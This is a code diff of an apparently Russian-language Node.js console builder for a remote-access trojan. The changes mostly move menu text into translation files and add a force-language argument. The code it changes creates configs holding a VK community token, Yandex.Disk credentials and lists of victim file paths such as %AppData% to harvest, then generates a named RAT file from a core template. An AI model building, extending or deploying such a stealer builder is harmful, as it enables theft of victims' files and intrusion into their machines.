@@ -1,7 +1,5 @@
 const fs = require("fs-extra")
 const stdio = require("stdio")
-const { exit } = require("process")
-const { constants } = require("buffer")
 
 var configsobj = {
     configsfolderpath: `${__dirname}\\configs`,
@@ -25,19 +23,20 @@ var langsobj = {
 var nowlang
 
 const debugmode = process.argv[2]
+const forcelanguage = process.argv[3]
 
 var menu = {}
+
 menu.clearscreen = function () {
     if (debugmode != "-debug") {
         console.clear()
     }
 }
-
 menu.mainmenu = function () {
     menu.clearscreen()
     return new Promise(function () {
         console.log(nowlang.mainmenu.top)
-        stdio.ask("1. Управление конфигами\n2. Управление ратниками\n3. Смена языка\n4. Перезагрузка\nВвод").then(mainmenuanswer => {
+        stdio.ask(nowlang.mainmenu.ask).then(mainmenuanswer => {
             let inp = parseInt(mainmenuanswer, 10)
             if (inp == 1) {//
                 menu.configsmenu().then(() => {
@@ -57,12 +56,13 @@ menu.mainmenu = function () {
         })
     })
 }
+
 //Lang
 menu.changelang = function () {
     menu.clearscreen()
     return new Promise(function (resolve) {
-        console.log("==================\nСМЕНА ЯЗЫКОВ\n==================")
-        console.log(`ТЕКУЩИЙ ЯЗЫК => ${langsobj.langs.localnames[langsobj.nowlagnint]}\n==================`)
+        console.log(nowlang.langs.changelang.top)
+        console.log(`${nowlang.langs.changelang.ask.one}${langsobj.langs.localnames[langsobj.nowlagnint]}${nowlang.langs.changelang.ask.two}`)
         new Promise(function (resolve) {
             if(langsobj.langs.paths.length != 0){
                 for (let index = 0; index < langsobj.langs.paths.length; index++) {
@@ -73,16 +73,14 @@ menu.changelang = function () {
                     }
                 }
             } else {
-                console.log("Языков не обнаружено")
+                console.log(nowlang.langs.changelang.langsnotfinded)
                 resolve(true)
             }
         }).then(()=>{
-            console.log("==================")
-            stdio.ask("Введите порядковый номер").then((answ)=>{
+            console.log(nowlang.langs.changelang.bot)
+            stdio.ask(nowlang.langs.changelang.chooselang).then((answ)=>{
                 let temp = parseInt(answ, 10)
-                langsobj.nowlagnint = temp - 1
-                nowlang = langsobj.langs.translations[langsobj.nowlagnint]
-                let data = `{"localname": "${langsobj.langs.localnames[langsobj.nowlagnint]}"}`
+                let data = `{"localname": "${langsobj.langs.localnames[temp - 1]}"}`
                 fs.exists(__dirname+"\\translations\\selected.json",(exist) =>{
                     if(exist){
                         fs.remove(__dirname+"\\translations\\selected.json").then(()=>{
@@ -95,6 +93,7 @@ menu.changelang = function () {
                             menu.init()
                         })
                     }
+                    process.exit(0)
                 })
             }) 
         })
@@ -113,7 +112,7 @@ menu.configsprint = function () {
                 }
             }
         } else {
-            console.log("Конфигов не обнаружено")
+            console.log(nowlang.configs.configsprint.configsnotfinded)
             resolve(true)
         }
     })
@@ -121,11 +120,11 @@ menu.configsprint = function () {
 menu.configsmenu = function () {
     menu.clearscreen()
     //console.clear()
-    console.log("======================\n|УПРАВЛЕНИЕ КОНФИГАМИ|\n======================")
+    console.log(nowlang.configs.configsmenu.top)
     return new Promise(function (resolve) {
         menu.configsprint().then(resofprint => {
-            console.log("======================")
-            stdio.ask("1. Создать конфиг\n2. Удалить конфиг\n3. Скопировать конфиг\n4. Назад в главное меню\nВвод").then((answer) => {
+            console.log(nowlang.configs.configsmenu.bot)
+            stdio.ask(nowlang.configs.configsmenu.ask).then((answer) => {
                 let intanswer = parseInt(answer, 10)
                 if (intanswer == 1) {
                     menu.configcreate().then(() => {
@@ -147,19 +146,19 @@ menu.configsmenu = function () {
 menu.configcreate = function () {
     menu.clearscreen()
     return new Promise(function () {
-        console.log("======================\n|==СОЗДАНИЕ КОНФИГА==|\n======================")
-        stdio.ask("Введите название вашего конфига").then((configname) => {
-            stdio.ask("Введите доп. информацию для вашего конфига").then((localname) => {
-                stdio.ask("Введите ключ сообщества").then((token) => {
-                    stdio.ask("Введите ID сообщества").then((groupid) => {
+        console.log(nowlang.configs.configcreate.top)
+        stdio.ask(nowlang.configs.configcreate.asks.configname).then((configname) => {
+            stdio.ask(nowlang.configs.configcreate.asks.localname).then((localname) => {
+                stdio.ask(nowlang.configs.configcreate.asks.token).then((token) => {
+                    stdio.ask(nowlang.configs.configcreate.asks.groupid).then((groupid) => {
                         let intgroupid = parseInt(groupid, 10)
-                        stdio.ask("Введите логин от Yandex.Disk").then((YandexLogin) => {
-                            stdio.ask("Введите пароль от Yandex.Disk").then((YandexPassword) => {
-                                stdio.ask("Желаете ли вы, использовать базу данных с известными файлами? (Да\\Нет)").then((useDataBase) => {
+                        stdio.ask(nowlang.configs.configcreate.asks.yandexlogin).then((YandexLogin) => {
+                            stdio.ask(nowlang.configs.configcreate.asks.yandexpassword).then((YandexPassword) => {
+                                stdio.ask(nowlang.configs.configcreate.asks.usedatabase).then((useDataBase) => {
                                     let finalconfig = { files: [], group: {}, localname: "",yandex: {} }
                                     finalconfig.localname = localname; finalconfig.group.token = token; finalconfig.group.id = intgroupid;finalconfig.yandex.login = YandexLogin;finalconfig.yandex.password = YandexPassword
                                     new Promise(function (resolve) {
-                                        console.log("Теперь вы должны ввести путь к файлам \\ папкам \nПример - (C://myfolder/myfile.txt || %AppData%/../local/myfolder || )\nЕсли вы захотите закончить ввод файлов, то введите 0")
+                                        console.log(nowlang.configs.configcreate.asks.filesinputhelp)
                                         if (useDataBase == "Да" || useDataBase == "да" || useDataBase == "Y" || useDataBase == "y" || useDataBase == "Yes" || useDataBase == "yes") {
                                             finalconfig.files = require("./database.json")
                                         }
@@ -180,7 +179,7 @@ menu.configcreate = function () {
                                             resolve(true)
                                         })
                                     }).then(() => {
-                                        console.log("Создаём конфиг...")
+                                        console.log(nowlang.configs.configcreate.createconfig)
                                         finalconfig = JSON.stringify(finalconfig)
                                         fs.writeFile(`./configs/${configname}.json`, finalconfig, (err) => {
                                             if (err) {
@@ -207,6 +206,7 @@ menu.configdelete = function () { // not ready
 menu.configcopy = function () { // not ready
     
 }
+
 // Rats
 menu.ratdeleting = function () { // not ready
     return new Promise(function (resolve) {
@@ -217,16 +217,16 @@ menu.ratcreating = function () {
     menu.clearscreen()
 
     return new Promise(function (resolve) {
-        console.log("\n======================\n|==СОЗДАНИЕ РАТНИКА==|\n======================")
+        console.log(nowlang.rats.ratcreating.top)
         menu.configsprint().then(() => {
-            console.log("======================")
+            console.log(nowlang.rats.ratcreating.bot)
 
 
-            stdio.ask("Выберите конфиг, введя его порядковый номер").then(selectedconfig => {
+            stdio.ask(nowlang.rats.ratcreating.asks.selectedconfig).then(selectedconfig => {
                 let intselectedconfig = parseInt(selectedconfig, 10)
                 //console.log(`\n${typeof (intselectedconfig)} |   ${typeof (selectedconfig)}`)
 
-                stdio.ask("Введите название вашего ратника (на английском, без использования спец. символов)").then(ratfilename => {
+                stdio.ask(nowlang.rats.ratcreating.asks.ratfilename).then(ratfilename => {
 
                     fs.readFile(`${__dirname}\\ratresources\\ratvirus\\ratcore.js`, 'utf8', function (err, contents) {
                         if (!err) {
@@ -297,8 +297,8 @@ menu.ratcreating = function () {
 menu.ratmenu = function () {
     menu.clearscreen()
     return new Promise(function () {
-        console.log("===============\n|МЕНЮ РАТНИКОВ|\n===============")
-        stdio.ask("1. Создать ратник\n2. Удалить ратник\n3. Назад в главное меню\nВвод").then(answer => {
+        console.log(nowlang.rats.ratmenu.top)
+        stdio.ask(nowlang.rats.ratmenu.ask).then(answer => {
             let intanswer = parseInt(answer, 10)
 
             if (intanswer == 1) {
@@ -332,10 +332,11 @@ menu.reloadlangs = function () {
                             filestotal--
                         }
                         for (let index = 0; index < files.length; index++) {
-                            console.log(`lol kek ${index} is ${index >= files.length - 1}`)
+                            console.log(`lol kek ${index} is ${index >= files.length - 1}  files: ${filestotal}`)
                             let lastchar = files[index].split(".")
                             fs.stat(`${langsobj.langsfolderpath}/${files[index]}`, (err, stats) => {
                                 if (stats.isFile() == true) {
+                                    
                                     if (lastchar[lastchar.length - 1] == "json" && lastchar[0] != "selected") {
                                         langsobj.langs.paths[langsobj.langs.paths.length] = `${langsobj.langsfolderpath}/${files[index]}`
                                         let conf = require(`${langsobj.langs.paths[langsobj.langs.paths.length - 1]}`)
@@ -348,6 +349,9 @@ menu.reloadlangs = function () {
                                                 langsobj.nowlagnint = langsobj.langs.paths.length - 1
                                                 console.log(`${langsobj.langs.translations[langsobj.nowlagnint]} Установлен язык Русский`)
                                                 nowlang = langsobj.langs.translations[langsobj.nowlagnint]
+                                                if (index >= files.length - 1) {
+                                                    resolve(true)
+                                                }
                                             }
                                         } else {
                                             let selectedlang = require(__dirname+"\\translations\\selected.json")
@@ -357,17 +361,22 @@ menu.reloadlangs = function () {
                                                 console.log(`${langsobj.langs.translations[langsobj.nowlagnint]} Установлен язык ${selectedlang.localname}  SELECTED`)
                                                 nowlang = langsobj.langs.translations[langsobj.nowlagnint]
                                             }
+                                            if (index >= files.length - 1) {
+                                                resolve(true)
+                                            }
                                         }
                                     } else {
                                         if (index >= files.length - 1) {
                                             resolve(true)
                                         }
                                     }
+                                    
                                 } else {
                                     if (index >= files.length - 1) {
                                         resolve(true)
                                     }
                                 }
+                                
                             })
                         }         
                     })
@@ -439,15 +448,16 @@ menu.init = function () {
     })
 }
 fs.exists(configsobj.configsfolderpath, isHereConfigsFolder => {
+    console.log(`Debug: ${debugmode} | Language Force selected: ${forcelanguage}`)
     if (isHereConfigsFolder) {
         menu.init()
     } else {
-        console.log("Отсутвует папка configs... " + __dirname)
+        console.log(nowlang.sys.start.configfoldernonfinded + __dirname)
         fs.mkdir(configsobj.configsfolderpath, err => {
             if (err) {
 
             } else {
-                console.log("Программа создала папку configs...")
+                console.log(nowlang.sys.start.configfolderhasbeencreated)
                 menu.init()
             }
         })
